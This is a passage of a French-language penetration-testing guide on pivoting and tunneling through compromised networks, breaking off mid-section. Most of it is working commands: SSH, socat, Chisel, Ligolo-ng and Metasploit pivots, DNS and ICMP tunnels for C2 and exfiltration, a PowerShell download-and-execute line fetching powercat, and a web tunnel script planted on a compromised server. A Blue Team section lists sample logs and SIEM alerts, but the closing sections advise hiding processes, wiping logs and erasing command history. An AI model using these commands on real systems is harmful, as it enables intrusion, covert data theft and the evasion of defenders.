### Techniques de pivoting de base

#### Port Forwarding avec SSH

1. **Local Port Forwarding**
   - Redirection d'un port local vers un port distant via un serveur SSH
   - Utile pour accéder à des services sur des réseaux internes
   
   ```bash
   # Syntaxe : ssh -L [adresse_locale:]port_local:hôte_distant:port_distant utilisateur@serveur_ssh
   
   # Exemple : Rediriger le port local 8080 vers le port 80 de 192.168.1.10 via le serveur SSH pivot
   ssh -L 8080:192.168.1.10:80 utilisateur@pivot
   
   # Accès au service via localhost:8080
   curl http://localhost:8080/
   ```

2. **Remote Port Forwarding**
   - Redirection d'un port distant vers un port local via un serveur SSH
   - Utile pour exposer des services locaux à des systèmes distants
   
   ```bash
   # Syntaxe : ssh -R [adresse_distante:]port_distant:hôte_local:port_local utilisateur@serveur_ssh
   
   # Exemple : Exposer le port local 8000 sur le port 80 du serveur SSH
   ssh -R 80:localhost:8000 utilisateur@pivot
   
   # Sur le serveur SSH, accès au service via localhost:80
   ```

3. **Dynamic Port Forwarding (SOCKS Proxy)**
   - Création d'un proxy SOCKS sur un port local via un serveur SSH
   - Permet de router tout le trafic via le serveur SSH
   
   ```bash
   # Syntaxe : ssh -D [adresse_locale:]port_local utilisateur@serveur_ssh
   
   # Exemple : Créer un proxy SOCKS sur le port local 1080
   ssh -D 1080 utilisateur@pivot
   
   # Configuration de proxychains pour utiliser le proxy SOCKS
   # Modifier /etc/proxychains.conf pour ajouter :
   # socks5 127.0.0.1 1080
   
   # Utilisation avec proxychains
   proxychains nmap -sT -Pn 192.168.1.10
   proxychains firefox
   ```

4. **Chaînage de tunnels SSH**
   - Création de tunnels SSH à travers plusieurs hôtes
   - Permet d'atteindre des réseaux profondément segmentés
   
   ```bash
   # Exemple : Tunnel à travers deux hôtes
   # Étape 1 : Créer un tunnel SSH avec proxy SOCKS vers le premier pivot
   ssh -D 1080 utilisateur@pivot1
   
   # Étape 2 : Utiliser proxychains pour SSH vers le deuxième pivot via le premier
   proxychains ssh -D 1081 utilisateur@pivot2
   
   # Étape 3 : Configurer un deuxième proxychains pour utiliser le deuxième proxy
   # Créer un fichier proxychains2.conf avec :
   # socks5 127.0.0.1 1081
   
   # Utilisation du deuxième proxy
   proxychains -f proxychains2.conf nmap -sT -Pn 192.168.2.10
   ```

#### Port Forwarding avec Socat

1. **Redirection de port simple**
   - Redirection d'un port local vers un port distant
   - Alternative légère à SSH pour le port forwarding
   
   ```bash
   # Syntaxe : socat TCP-LISTEN:port_local,fork TCP:hôte_distant:port_distant
   
   # Exemple : Rediriger le port local 8080 vers le port 80 de 192.168.1.10
   socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
   
   # Accès au service via localhost:8080
   curl http://localhost:8080/
   ```

2. **Relais TCP avec authentification**
   - Création d'un relais TCP avec authentification par mot de passe
   - Utile pour limiter l'accès au tunnel
   
   ```bash
   # Sur le serveur pivot
   socat TCP-LISTEN:8080,fork,reuseaddr EXEC:'bash -c "read -p \"Password: \" pass; if [[ \$pass == \"secret\" ]]; then socat STDIO TCP:192.168.1.10:80; else echo \"Invalid password\"; fi"'
   
   # Sur le client
   echo "secret" | socat TCP:pivot:8080 -
   ```

3. **Tunnels chiffrés avec Socat**
   - Création de tunnels chiffrés avec SSL/TLS
   - Protection des données en transit
   
   ```bash
   # Génération de certificats
   openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
   cat server.key server.crt > server.pem
   
   # Sur le serveur pivot
   socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,fork TCP:192.168.1.10:80
   
   # Sur le client
   socat TCP-LISTEN:8080,fork OPENSSL:pivot:8443,verify=0
   
   # Accès au service via localhost:8080
   curl http://localhost:8080/
   ```

4. **Pivoting avec Socat et fichiers FIFO**
   - Utilisation de fichiers FIFO pour créer des tunnels
   - Utile dans des environnements restreints
   
   ```bash
   # Sur le serveur pivot
   mkfifo /tmp/fifo
   cat /tmp/fifo | nc 192.168.1.10 80 | nc -l 8080 > /tmp/fifo
   
   # Sur le client
   nc pivot 8080
   ```

### Techniques de pivoting avancées

#### Pivoting avec Metasploit

1. **Configuration des routes**
   - Ajout de routes pour accéder à des réseaux via une session Meterpreter
   - Permet d'utiliser les modules Metasploit à travers le pivot
   
   ```
   # Dans msfconsole, après avoir obtenu une session Meterpreter
   
   # Affichage des interfaces réseau du système compromis
   meterpreter > ipconfig
   
   # Ajout d'une route pour le réseau 192.168.1.0/24 via la session 1
   meterpreter > run autoroute -s 192.168.1.0/24
   
   # Ou depuis le prompt msf
   msf > route add 192.168.1.0/24 1
   
   # Vérification des routes
   msf > route print
   
   # Utilisation de modules à travers le pivot
   msf > use auxiliary/scanner/http/http_version
   msf > set RHOSTS 192.168.1.10
   msf > run
   ```

2. **Proxy SOCKS avec Metasploit**
   - Création d'un proxy SOCKS pour accéder au réseau interne
   - Permet d'utiliser des outils externes via le pivot
   
   ```
   # Dans msfconsole, après avoir configuré les routes
   
   # Démarrage du serveur proxy SOCKS
   msf > use auxiliary/server/socks_proxy
   msf > set SRVPORT 1080
   msf > run -j
   
   # Configuration de proxychains
   # Modifier /etc/proxychains.conf pour ajouter :
   # socks5 127.0.0.1 1080
   
   # Utilisation avec proxychains
   proxychains nmap -sT -Pn 192.168.1.10
   proxychains firefox
   ```

3. **Port Forwarding avec Meterpreter**
   - Redirection de ports spécifiques via une session Meterpreter
   - Alternative au proxy SOCKS pour des services spécifiques
   
   ```
   # Dans une session Meterpreter
   
   # Redirection du port local 8080 vers le port 80 de 192.168.1.10
   meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
   
   # Vérification des redirections de port
   meterpreter > portfwd list
   
   # Suppression d'une redirection
   meterpreter > portfwd delete -l 8080
   
   # Redirection inverse (remote port forwarding)
   meterpreter > portfwd add -R -l 8080 -p 80 -r 192.168.1.10
   ```

4. **Pivoting avec le module socks_unc**
   - Utilisation du module socks_unc pour le pivoting SMB
   - Permet d'accéder aux partages SMB via le pivot
   
   ```
   # Dans msfconsole, après avoir configuré les routes
   
   # Démarrage du serveur socks_unc
   msf > use auxiliary/server/socks_unc
   msf > set SRVPORT 1080
   msf > run -j
   
   # Accès aux partages SMB via le proxy UNC
   # \\127.0.0.1@1080\192.168.1.10\share
   ```

#### Pivoting avec Chisel

1. **Installation et configuration**
   - Chisel est un outil de tunneling TCP/UDP rapide basé sur HTTP
   - Fonctionne en mode client/serveur
   
   ```bash
   # Téléchargement de Chisel
   # Sur Kali Linux
   wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
   gunzip chisel_1.7.7_linux_amd64.gz
   chmod +x chisel_1.7.7_linux_amd64
   mv chisel_1.7.7_linux_amd64 chisel
   
   # Sur Windows
   # Télécharger https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
   # Décompresser et renommer en chisel.exe
   ```

2. **Proxy SOCKS avec Chisel**
   - Création d'un proxy SOCKS pour accéder au réseau interne
   - Fonctionne à travers les pare-feu restrictifs
   
   ```bash
   # Sur le serveur attaquant
   ./chisel server -p 8080 --reverse
   
   # Sur le client pivot
   ./chisel client 192.168.100.10:8080 R:socks
   
   # Configuration de proxychains
   # Modifier /etc/proxychains.conf pour ajouter :
   # socks5 127.0.0.1 1080
   
   # Utilisation avec proxychains
   proxychains nmap -sT -Pn 192.168.1.10
   ```

3. **Port Forwarding avec Chisel**
   - Redirection de ports spécifiques via Chisel
   - Permet d'accéder à des services spécifiques
   
   ```bash
   # Sur le serveur attaquant
   ./chisel server -p 8080 --reverse
   
   # Sur le client pivot (redirection du port 80 de 192.168.1.10 vers le port 8000 de l'attaquant)
   ./chisel client 192.168.100.10:8080 R:8000:192.168.1.10:80
   
   # Accès au service via localhost:8000
   curl http://localhost:8000/
   ```

4. **Tunneling avec Chisel en mode chiffré**
   - Utilisation du chiffrement pour protéger les données en transit
   - Contournement de l'inspection SSL/TLS
   
   ```bash
   # Sur le serveur attaquant
   ./chisel server -p 8080 --key "clé_secrète" --reverse
   
   # Sur le client pivot
   ./chisel client --fingerprint "empreinte_du_serveur" --key "clé_secrète" 192.168.100.10:8080 R:socks
   ```

#### Pivoting avec Ligolo-ng

1. **Installation et configuration**
   - Ligolo-ng est un outil avancé de pivoting réseau
   - Permet de router le trafic au niveau IP (couche 3)
   
   ```bash
   # Téléchargement de Ligolo-ng
   # Sur Kali Linux
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   tar -xzf ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
   tar -xzf ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   
   # Configuration de l'interface TUN
   sudo ip tuntap add user $(whoami) mode tun ligolo
   sudo ip link set ligolo up
   ```

2. **Pivoting de niveau réseau**
   - Routage du trafic IP via l'agent Ligolo-ng
   - Permet d'accéder à des réseaux entiers
   
   ```bash
   # Sur le serveur attaquant
   ./proxy -selfcert
   
   # Sur le client pivot
   ./agent -connect 192.168.100.10:11601 -ignore-cert
   
   # Dans l'interface Ligolo-ng
   # Lister les interfaces réseau
   ligolo-ng » ifconfig
   
   # Démarrer une session
   ligolo-ng » session
   
   # Ajouter une route pour le réseau 192.168.1.0/24
   ligolo-ng » ip route add 192.168.1.0/24 dev ligolo
   
   # Sur le serveur attaquant, ajouter la route correspondante
   sudo ip route add 192.168.1.0/24 dev ligolo
   
   # Accès direct aux systèmes du réseau 192.168.1.0/24
   ping 192.168.1.10
   nmap -sT -Pn 192.168.1.10
   ```

3. **Tunneling de services spécifiques**
   - Redirection de services spécifiques via Ligolo-ng
   - Alternative au routage complet
   
   ```bash
   # Dans l'interface Ligolo-ng
   
   # Lister les services disponibles
   ligolo-ng » listener_list
   
   # Ajouter un listener pour rediriger le port 80 de 192.168.1.10 vers le port 8000 local
   ligolo-ng » listener_add --addr 0.0.0.0:8000 --to 192.168.1.10:80
   
   # Accès au service via localhost:8000
   curl http://localhost:8000/
   ```

4. **Chaînage de pivots avec Ligolo-ng**
   - Utilisation de plusieurs agents Ligolo-ng pour atteindre des réseaux profondément segmentés
   - Configuration de routes pour chaque segment
   
   ```bash
   # Sur le premier pivot
   ./agent -connect 192.168.100.10:11601 -ignore-cert
   
   # Dans l'interface Ligolo-ng, après avoir démarré une session
   ligolo-ng » ip route add 192.168.1.0/24 dev ligolo
   
   # Sur le serveur attaquant
   sudo ip route add 192.168.1.0/24 dev ligolo
   
   # Sur le deuxième pivot (accessible depuis le réseau 192.168.1.0/24)
   ./agent -connect 192.168.100.10:11601 -ignore-cert
   
   # Dans l'interface Ligolo-ng, après avoir sélectionné la session du deuxième pivot
   ligolo-ng » ip route add 192.168.2.0/24 dev ligolo
   
   # Sur le serveur attaquant
   sudo ip route add 192.168.2.0/24 dev ligolo
   
   # Accès direct aux systèmes du réseau 192.168.2.0/24
   ping 192.168.2.10
   nmap -sT -Pn 192.168.2.10
   ```

### Tunneling avancé

#### Tunneling DNS

1. **Principes du tunneling DNS**
   - Utilisation du protocole DNS pour encapsuler d'autres protocoles
   - Contournement des pare-feu qui autorisent le trafic DNS sortant
   - Exfiltration de données via des requêtes DNS

2. **Tunneling avec dnscat2**
   - Création d'un tunnel C2 via DNS
   - Permet l'exécution de commandes et le transfert de fichiers
   
   ```bash
   # Sur le serveur attaquant
   ruby dnscat2.rb --dns "domain=example.com" --no-cache
   
   # Sur le client pivot
   ./dnscat2 --domain example.com
   
   # Dans l'interface dnscat2
   dnscat2> window -i 1
   
   # Création d'un tunnel pour le port 80 de 192.168.1.10
   dnscat2> listen 8000 192.168.1.10 80
   
   # Accès au service via localhost:8000
   curl http://localhost:8000/
   ```

3. **Tunneling avec iodine**
   - Création d'un tunnel IP via DNS
   - Permet de router tout le trafic IP
   
   ```bash
   # Sur le serveur attaquant
   iodined -f -c -P password 10.0.0.1 tunnel.example.com
   
   # Sur le client pivot
   iodine -f -P password tunnel.example.com
   
   # Configuration de routes
   # Sur le serveur attaquant
   ip route add 192.168.1.0/24 via 10.0.0.2
   
   # Accès direct aux systèmes du réseau 192.168.1.0/24
   ping 192.168.1.10
   nmap -sT -Pn 192.168.1.10
   ```

4. **Optimisation des performances du tunneling DNS**
   - Techniques pour améliorer les performances des tunnels DNS
   - Compromis entre furtivité et performance
   
   ```bash
   # Avec iodine, augmentation de la taille des paquets
   iodined -f -c -P password -m 1130 10.0.0.1 tunnel.example.com
   
   # Sur le client pivot
   iodine -f -P password -m 1130 tunnel.example.com
   
   # Avec dnscat2, configuration du délai entre les requêtes
   ./dnscat2 --domain example.com --delay 500
   ```

#### Tunneling ICMP

1. **Principes du tunneling ICMP**
   - Utilisation du protocole ICMP (ping) pour encapsuler d'autres protocoles
   - Contournement des pare-feu qui autorisent le trafic ICMP sortant
   - Exfiltration de données via des paquets ICMP

2. **Tunneling avec ptunnel**
   - Création d'un tunnel TCP via ICMP
   - Permet d'accéder à des services spécifiques
   
   ```bash
   # Sur le serveur attaquant
   ptunnel -x password
   
   # Sur le client pivot
   ptunnel -p 192.168.100.10 -lp 8000 -da 192.168.1.10 -dp 80 -x password
   
   # Accès au service via localhost:8000
   curl http://localhost:8000/
   ```

3. **Tunneling avec icmptunnel**
   - Création d'un tunnel IP via ICMP
   - Permet de router tout le trafic IP
   
   ```bash
   # Sur le serveur attaquant
   ./icmptunnel -s
   ifconfig tun0 10.0.0.1 netmask 255.255.255.0
   
   # Sur le client pivot
   ./icmptunnel 192.168.100.10
   ifconfig tun0 10.0.0.2 netmask 255.255.255.0
   
   # Configuration de routes
   # Sur le serveur attaquant
   ip route add 192.168.1.0/24 via 10.0.0.2
   
   # Accès direct aux systèmes du réseau 192.168.1.0/24
   ping 192.168.1.10
   nmap -sT -Pn 192.168.1.10
   ```

4. **Techniques d'évasion pour le tunneling ICMP**
   - Modification des caractéristiques des paquets ICMP
   - Contournement des systèmes de détection d'intrusion
   
   ```bash
   # Avec ptunnel, modification du type ICMP
   ptunnel -x password -I 0
   
   # Avec icmptunnel, modification de la signature
   ./icmptunnel -s -m "ICMP Tunnel"
   ```

#### Tunneling HTTP/HTTPS

1. **Principes du tunneling HTTP/HTTPS**
   - Utilisation des protocoles HTTP/HTTPS pour encapsuler d'autres protocoles
   - Contournement des pare-feu qui autorisent le trafic web sortant
   - Exfiltration de données via des requêtes HTTP/HTTPS

2. **Tunneling avec reGeorg**
   - Création d'un tunnel SOCKS via HTTP/HTTPS
   - Utilisation d'un script PHP/ASP.NET/JSP sur le serveur web compromis
   
   ```bash
   # Téléchargement de reGeorg
   git clone https://github.com/sensepost/reGeorg.git
   
   # Déploiement du script tunnel.php sur le serveur web compromis
   
   # Sur le client attaquant
   python reGeorgSocksProxy.py -p 8080 -u http://compromised-server/tunnel.php
   
   # Configuration de proxychains
   # Modifier /etc/proxychains.conf pour ajouter :
   # socks5 127.0.0.1 8080
   
   # Utilisation avec proxychains
   proxychains nmap -sT -Pn 192.168.1.10
   ```

3. **Tunneling avec Chisel via HTTP/HTTPS**
   - Utilisation de Chisel en mode HTTP pour contourner les restrictions
   - Configuration de proxy web pour le tunneling
   
   ```bash
   # Sur le serveur attaquant
   ./chisel server -p 8080 --reverse --proxy https://corporate-proxy:8080
   
   # Sur le client pivot
   ./chisel client --fingerprint "empreinte_du_serveur" --proxy https://corporate-proxy:8080 192.168.100.10:8080 R:socks
   ```

4. **Tunneling avec Gost**
   - Création de tunnels multi-protocoles via HTTP/HTTPS
   - Support de chaînage de proxies
   
   ```bash
   # Sur le serveur attaquant
   ./gost -L=:8080 -F=ws://192.168.100.10:8000
   
   # Sur le client pivot
   ./gost -L=ws://:8000 -F=socks5://192.168.1.10:1080
   
   # Configuration de proxychains
   # Modifier /etc/proxychains.conf pour ajouter :
   # socks5 127.0.0.1 8080
   
   # Utilisation avec proxychains
   proxychains nmap -sT -Pn 192.168.1.10
   ```

### Pivoting dans des environnements spécifiques

#### Pivoting dans les environnements Windows

1. **Utilisation de netsh pour le port forwarding**
   - Redirection de ports avec l'outil natif netsh
   - Ne nécessite pas d'outils tiers
   
   ```cmd
   # Redirection du port local 8080 vers le port 80 de 192.168.1.10
   netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10
   
   # Vérification des redirections
   netsh interface portproxy show all
   
   # Suppression d'une redirection
   netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
   ```

2. **Pivoting avec plink.exe (PuTTY Link)**
   - Utilisation de plink.exe pour créer des tunnels SSH
   - Alternative à SSH sur Windows
   
   ```cmd
   # Redirection du port local 8080 vers le port 80 de 192.168.1.10 via le serveur SSH
   plink.exe -L 8080:192.168.1.10:80 utilisateur@serveur_ssh
   
   # Création d'un proxy SOCKS
   plink.exe -D 1080 utilisateur@serveur_ssh
   ```

3. **Pivoting avec SOCKS via PowerShell**
   - Implémentation d'un proxy SOCKS en PowerShell
   - Ne nécessite pas d'outils tiers
   
   ```powershell
   # Téléchargement et exécution de PowerCat
   IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
   
   # Création d'un proxy SOCKS
   powercat -l 1080 -p 22 -t 192.168.1.10 -r
   ```

4. **Pivoting avec WinRM et PowerShell Direct**
   - Utilisation de WinRM pour l'exécution de commandes à distance
   - Pivoting via des sessions PowerShell
   
   ```powershell
   # Création d'une session PowerShell vers le système pivot
   $session = New-PSSession -ComputerName pivot -Credential (Get-Credential)
   
   # Exécution de commandes sur le système pivot
   Invoke-Command -Session $session -ScriptBlock {
       # Commandes à exécuter sur le système pivot
       Test-NetConnection -ComputerName 192.168.1.10 -Port 80
   }
   
   # Création d'une session PowerShell vers un système du réseau interne via le pivot
   Invoke-Command -Session $session -ScriptBlock {
       $innerSession = New-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)
       Invoke-Command -Session $innerSession -ScriptBlock {
           # Commandes à exécuter sur le système interne
           whoami
       }
   }
   ```

#### Pivoting dans les environnements Linux

1. **Utilisation de iptables pour le port forwarding**
   - Redirection de ports avec iptables
   - Configuration du routage IP
   
   ```bash
   # Activation du forwarding IP
   echo 1 > /proc/sys/net/ipv4/ip_forward
   
   # Redirection du port local 8080 vers le port 80 de 192.168.1.10
   iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
   iptables -t nat -A POSTROUTING -j MASQUERADE
   
   # Vérification des règles
   iptables -t nat -L
   
   # Suppression d'une règle
   iptables -t nat -D PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
   ```

2. **Pivoting avec SSH et autossh**
   - Utilisation d'autossh pour maintenir des tunnels SSH persistants
   - Reconnexion automatique en cas de déconnexion
   
   ```bash
   # Installation d'autossh
   apt-get install autossh
   
   # Création d'un tunnel SSH persistant
   autossh -M 20000 -f -N -L 8080:192.168.1.10:80 utilisateur@serveur_ssh
   
   # Création d'un proxy SOCKS persistant
   autossh -M 20001 -f -N -D 1080 utilisateur@serveur_ssh
   ```

3. **Pivoting avec ncat (netcat)**
   - Utilisation de ncat pour créer des relais TCP
   - Alternative légère à socat
   
   ```bash
   # Redirection du port local 8080 vers le port 80 de 192.168.1.10
   ncat -l 8080 -c "ncat 192.168.1.10 80"
   
   # Création d'un relais bidirectionnel
   mkfifo /tmp/fifo
   ncat -l 8080 < /tmp/fifo | ncat 192.168.1.10 80 > /tmp/fifo
   ```

4. **Pivoting avec gost et frp**
   - Utilisation d'outils avancés de tunneling
   - Support de multiples protocoles et chaînage
   
   ```bash
   # Avec gost
   # Sur le serveur attaquant
   ./gost -L=:8080 -F=socks5://192.168.1.10:1080
   
   # Sur le client pivot
   ./gost -L=socks5://:1080
   
   # Avec frp
   # Sur le serveur attaquant (frps.ini)
   [common]
   bind_port = 7000
   
   # Sur le client pivot (frpc.ini)
   [common]
   server_addr = 192.168.100.10
   server_port = 7000
   
   [ssh]
   type = tcp
   local_ip = 127.0.0.1
   local_port = 22
   remote_port = 6000
   ```

#### Pivoting dans les environnements cloud

1. **Pivoting via les fonctions serverless**
   - Utilisation de fonctions AWS Lambda, Azure Functions ou Google Cloud Functions comme pivots
   - Contournement des restrictions réseau cloud
   
   ```python
   # Exemple de fonction AWS Lambda pour le pivoting
   import boto3
   import socket
   import base64
   
   def lambda_handler(event, context):
       target_host = event['target_host']
       target_port = int(event['target_port'])
       data = base64.b64decode(event['data'])
       
       # Connexion à la cible
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((target_host, target_port))
       s.sendall(data)
       
       # Réception de la réponse
       response = s.recv(4096)
       s.close()
       
       return {
           'statusCode': 200,
           'body': base64.b64encode(response).decode('utf-8')
       }
   ```

2. **Pivoting via les instances de calcul**
   - Utilisation d'instances EC2, Azure VM ou Google Compute Engine comme pivots
   - Configuration de tunnels SSH ou de proxies
   
   ```bash
   # Connexion à l'instance cloud
   ssh -i key.pem user@cloud-instance
   
   # Création d'un tunnel SSH
   ssh -i key.pem -L 8080:internal-service:80 user@cloud-instance
   
   # Création d'un proxy SOCKS
   ssh -i key.pem -D 1080 user@cloud-instance
   ```

3. **Pivoting via les services de conteneurs**
   - Utilisation de conteneurs Docker, Kubernetes ou services de conteneurs cloud
   - Déploiement d'outils de pivoting dans des conteneurs
   
   ```bash
   # Déploiement d'un conteneur avec socat
   docker run -d -p 8080:8080 alpine/socat tcp-listen:8080,fork tcp:internal-service:80
   
   # Déploiement d'un conteneur avec chisel
   docker run -d -p 8080:8080 jpillora/chisel server -p 8080 --reverse
   ```

4. **Pivoting via les VPN cloud**
   - Utilisation de services VPN cloud comme AWS Client VPN, Azure VPN Gateway
   - Accès direct aux réseaux cloud privés
   
   ```bash
   # Configuration d'un client OpenVPN pour AWS Client VPN
   openvpn --config client-config.ovpn
   
   # Accès direct aux services internes
   curl http://internal-service.internal:80/
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par le pivoting SSH

1. **Logs d'authentification**
   - Connexions SSH depuis des sources inhabituelles
   - Authentifications multiples en peu de temps
   - Utilisation d'options de tunneling (-L, -R, -D)
   
   **Exemple de log d'authentification :**
   ```
   May 15 14:23:45 server sshd[1234]: Accepted publickey for user from 192.168.1.100 port 54321 ssh2
   May 15 14:23:45 server sshd[1234]: User user from 192.168.1.100 forwarded port to 192.168.2.10:80
   ```

2. **Logs de connexion**
   - Sessions SSH de longue durée
   - Faible activité interactive malgré une connexion active
   - Trafic important sur des connexions SSH
   
   **Exemple de log de connexion :**
   ```
   May 15 14:23:45 server sshd[1234]: Connection from 192.168.1.100 port 54321 on 192.168.1.10 port 22
   May 15 14:23:45 server sshd[1234]: New session: session 0 by user
   ```

3. **Logs réseau**
   - Trafic SSH anormalement élevé
   - Connexions à des ports inhabituels après une connexion SSH
   - Patterns de trafic réguliers (tunneling)
   
   **Exemple de log réseau :**
   ```
   May 15 14:23:45 server kernel: [1234] IN=eth0 OUT=eth1 SRC=192.168.1.100 DST=192.168.2.10 LEN=60 TOS=0x00 PREC=0x00 TTL=63 ID=12345 DF PROTO=TCP SPT=54321 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
   ```

#### Traces générées par les outils de pivoting

1. **Logs de processus**
   - Exécution d'outils de pivoting (socat, chisel, ligolo-ng)
   - Processus écoutant sur des ports inhabituels
   - Processus avec des connexions réseau multiples
   
   **Exemple de log de processus :**
   ```
   May 15 14:23:45 server audit[1234]: EXECVE pid=1234 uid=1000 gid=1000 euid=1000 egid=1000 ppid=1233 exe="/usr/bin/socat" args="socat TCP-LISTEN:8080,fork TCP:192.168.2.10:80"
   ```

2. **Logs de pare-feu**
   - Connexions à des ports inhabituels
   - Trafic entre segments réseau normalement isolés
   - Tentatives de connexion à des services internes depuis des hôtes externes
   
   **Exemple de log de pare-feu :**
   ```
   May 15 14:23:45 firewall kernel: REJECT IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=192.168.1.100 DST=192.168.2.10 LEN=60 TOS=0x00 PREC=0x00 TTL=63 ID=12345 DF PROTO=TCP SPT=54321 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
   ```

3. **Logs système**
   - Modifications de configuration réseau (routes, iptables)
   - Création d'interfaces réseau virtuelles (tun/tap)
   - Activation du forwarding IP
   
   **Exemple de log système :**
   ```
   May 15 14:23:45 server kernel: IPv4 forwarding is enabled
   May 15 14:23:45 server kernel: tun0: Disabled Privacy Extensions
   ```

#### Traces générées par le tunneling DNS/ICMP/HTTP

1. **Logs DNS**
   - Requêtes DNS anormalement nombreuses
   - Requêtes DNS avec des noms de domaine inhabituellement longs
   - Requêtes DNS pour des sous-domaines aléatoires
   
   **Exemple de log DNS :**
   ```
   May 15 14:23:45 server named[1234]: client 192.168.1.100#54321: query: a123b456c789d012e345f678g901h234i567j890.tunnel.example.com IN A
   ```

2. **Logs ICMP**
   - Trafic ICMP anormalement élevé
   - Paquets ICMP de taille inhabituelle
   - Paquets ICMP avec des données dans la charge utile
   
   **Exemple de log ICMP :**
   ```
   May 15 14:23:45 server kernel: ICMP echo request, id 1234, seq 1, length 1024
   ```

3. **Logs HTTP/HTTPS**
   - Requêtes HTTP/HTTPS anormalement nombreuses
   - Requêtes HTTP/HTTPS avec des en-têtes ou des corps inhabituels
   - Connexions HTTP/HTTPS de longue durée
   
   **Exemple de log HTTP :**
   ```
   May 15 14:23:45 server apache2[1234]: 192.168.1.100 - user [15/May/2023:14:23:45 +0000] "POST /tunnel.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
   ```

#### Alertes SIEM typiques

**Alerte de tunneling SSH :**
```
[ALERT] SSH Tunneling Detected
Host: server01
User: user
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: SSH port forwarding detected, potential pivoting activity
Severity: High
```

**Alerte de tunneling DNS :**
```
[ALERT] DNS Tunneling Detected
Host: dns-server
Source IP: 192.168.1.100
Time: 2023-05-15 14:24:12
Details: Abnormal DNS traffic pattern, potential data exfiltration or C2 communication
Affected Domain: tunnel.example.com
Severity: High
```

**Alerte de modification de routage :**
```
[ALERT] Network Routing Modification Detected
Host: server01
User: root
Time: 2023-05-15 14:35:27
Details: IP forwarding enabled and new routes added, potential pivoting activity
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs de configuration

1. **Exposition excessive des tunnels**
   - Écoute sur toutes les interfaces (0.0.0.0) au lieu de localhost (127.0.0.1)
   - Absence d'authentification pour les tunnels
   - Utilisation de ports standards facilement identifiables
   
   **Solution :** Limiter l'écoute à localhost quand c'est possible, implémenter l'authentification, utiliser des ports non standards.

2. **Problèmes de routage**
   - Conflits de routes
   - Oubli d'activer le forwarding IP
   - Mauvaise configuration des règles de pare-feu
   
   **Solution :** Vérifier les tables de routage avant d'ajouter de nouvelles routes, activer le forwarding IP, configurer correctement les règles de pare-feu.

3. **Problèmes de DNS**
   - Résolution DNS incorrecte dans les tunnels
   - Fuites DNS révélant l'activité de pivoting
   - Blocage des requêtes DNS inhabituelles
   
   **Solution :** Configurer correctement la résolution DNS dans les tunnels, utiliser des serveurs DNS fiables, éviter les fuites DNS.

#### Erreurs de stabilité

1. **Tunnels instables**
   - Déconnexions fréquentes
   - Absence de mécanisme de reconnexion automatique
   - Timeout des connexions inactives
   
   **Solution :** Utiliser des outils avec reconnexion automatique (autossh), implémenter des mécanismes de keepalive, surveiller l'état des tunnels.

2. **Surcharge des tunnels**
   - Bande passante insuffisante
   - Latence élevée
   - Perte de paquets
   
   **Solution :** Limiter le trafic dans les tunnels, utiliser des protocoles adaptés à la qualité de la connexion, implémenter des mécanismes de contrôle de flux.

3. **Problèmes de MTU**
   - Fragmentation des paquets
   - Blocage des paquets fragmentés
   - Overhead des protocoles de tunneling
   
   **Solution :** Ajuster la MTU des interfaces de tunnel, éviter la fragmentation, utiliser des protocoles avec moins d'overhead.

#### Erreurs de détectabilité

1. **Signatures de trafic évidentes**
   - Patterns de trafic réguliers
   - Volumes de trafic anormaux
   - Protocoles inhabituels
   
   **Solution :** Randomiser les patterns de trafic, limiter le volume de trafic, utiliser des protocoles courants.

2. **Artefacts système visibles**
   - Processus suspects
   - Connexions réseau inhabituelles
   - Fichiers temporaires non supprimés
   
   **Solution :** Masquer les processus, limiter les connexions réseau visibles, nettoyer les fichiers temporaires.

3. **Logs non nettoyés**
   - Traces d'activité dans les logs système
   - Historique de commandes
   - Logs de connexion
   
   **Solution :** Désactiver la journalisation quand c'est possible, nettoyer les logs, effacer l'historique de commandes.

### OPSEC Tips : pivoting discret

#### Techniques de base

1. **Choix des protocoles**
   ```bash
   # Préférer HTTPS à HTTP
   ./chisel client https://192.168.100.10:443 R:socks
   
   # Utiliser des protocoles courants (HTTP, HTTPS, DNS)
   ./gost -L=:443 -F=wss://192.168.100.10:443
   ```

2. **Limitation du bruit réseau**
   ```bash
   # Limitation de la bande passante avec SSH
   ssh -L 8080:192.168.1.10:80 -o "IPQoS=throughput" utilisateur@serveur_ssh
   
   # Limitation du taux de requêtes avec dnscat2
   ./dnscat2 --dns "domain=example.com" --max-retransmits 1 --delay 1000
   ```

3. **Utilisation de délais et de jitter**
   ```bash
   # Ajout de délais aléatoires entre les requêtes
   python -c "import time, random; time.sleep(random.uniform(1, 5))"
   
   # Configuration de jitter dans les outils de C2
   ./agent -connect 192.168.100.10:443 -jitter 30
   ```

#### Techniques avancées

1. **Mimétisme de trafic légitime**
   ```bash
   # Utilisation d'en-têtes HTTP légitimes
